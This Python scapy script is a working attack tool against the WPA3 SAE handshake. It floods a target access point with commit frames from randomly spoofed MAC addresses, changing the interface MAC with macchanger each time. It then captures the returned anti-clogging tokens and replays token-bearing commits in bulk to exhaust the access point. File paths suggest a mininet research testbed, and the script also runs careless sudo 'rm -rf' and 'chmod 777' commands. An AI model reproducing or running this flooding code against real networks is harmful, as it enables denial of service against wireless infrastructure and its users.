from scapy.all import *

import random, sys, os, subprocess, array, os.path
from scalars_and_finites import scalar_list, finite_list

group = '\x13\x00'
count = 100
bssid = '02:00:00:00:00:00'
client = '02:00:00:00:01:00'
filename = 'pmk_gobbler.txt'

# create file
def create_mac_file(count, filename):
  os.system('sudo rm -rf "%s"'% filename)
  
  for n in range(int(count)):
    mac = '%02x:%02x:%02x:%02x:%02x:%02x'%(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

    with open(filename, 'a') as fs:
      fs.write(str(mac))
      fs.write('\n')
      fs.close()
  global f
  f = open(filename, 'r')
  os.system('sudo chmod 777 -R "%s"'% filename)
  
  
def rand_mac():
  return '%02x:%02x:%02x:%02x:%02x:%02x'%(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
  
def auth_frame():
  client =  f.readline()
  return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)
  
def auth_frame_mac(mac):
  return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)

#  b_scalar = bytes.fromhex(random.choice(scala_list))
#  b_finite = bytes.fromhex(random.choice(finite_list))

def scalar():
  return bytes.fromhex(random.choice(scalar_list))
  
def finite():
  return bytes.fromhex(random.choice(finite_list))
  
def construct(mac):
  Auth = auth_frame_mac(mac)
  Scalar = scalar()
  Finite = finite()
  return Auth/group/Scalar/Finite
  
def construct_token(token, mac):
  Auth = auth_frame()
  Scalar = scalar()
  Finite = finite()
  return Auth/group/token/Scalar/Finite
  
start = True
filename_pcap = '/home/ubuntu-2204-mininet/Desktop/token.pcap'
intf = sys.argv[1]

print('Creating file with MAC addrs ... ')
create_mac_file(count, filename)
print('Done!')

global f
f = open(filename, 'r')
os.system('sudo chmod 777 -R "%s"'% filename)


for p in range(100):
  for n in range(int(count)):
    
    if start == True:
      if os.path.isfile(filename_pcap) == True:
        os.system('sudo rm -rf ' + filename_pcap)
        
      try:
        listener = subprocess.Popen(['sudo tcpdump -i "%s" -w "%s" -e -s 0 type mgt subtype auth and \(wlan src "%s"\)'%("mon0", filename_pcap, bssid)], stdout=subprocess.PIPE, shell=True)
      except Exception as e:
        print('Error: ' + str(e))
      
      print("create listener\n")
      start = False
      
    victim_mac = f.readline()
    
    # change mac address
     #print("set mac to %s in %s" %(victim_mac, intf))
    os.system('sudo ifconfig %s down' % intf)
    os.system('sudo macchanger --mac=%s %s' % (victim_mac, intf))
    os.system('sudo iw dev %s set type monitor' % intf)
    os.system('sudo ifconfig %s up' % intf)
    
    sendp(construct(victim_mac), inter=0.0001, count=5, iface=intf)
    # print('\nSAE Commit frame send: ' + str(n))
    
  with open(filename) as k:
    for mac in k:
      start = True
      counttries = 0
      add_argument = 'wlan.da ==' + mac
      process = subprocess.Popen('sudo tshark -r "%s" -Y "%s" -T fields -e wlan.fixed.anti_clogging_token'%(filename_pcap, add_argument), stdout=subprocess.PIPE, shell=True)
      process.wait()
  
      #anti_token = process.communicate()[0]
      #sep = '\n'
      #anti_token = anti_token.split(sep, 1)[0]
      #anti_token = anti_token.strip()
      
      

      anti_token = process.communicate()[0]
      anti_token = anti_token.decode('ascii')

      
      if anti_token != '':
        try:
          sendp(construct_token(anti_token, mac), inter=0.0001, count=128, iface='sta1-wlan0')
          print('\nSAE Commit frame with cookie send: ' + str(counttries))
          counttries = counttries + 1
          
        except Exception as e:
          print('Error: ' + str(e))
         
    listener.terminate()
         
  # os.system('sudo rm -rf ' + filename_pcap)      
  # k.close()
  # f.close()  
  print('Round is : ' + str(p))
  f.seek(0)
          
          
  
  
  
  
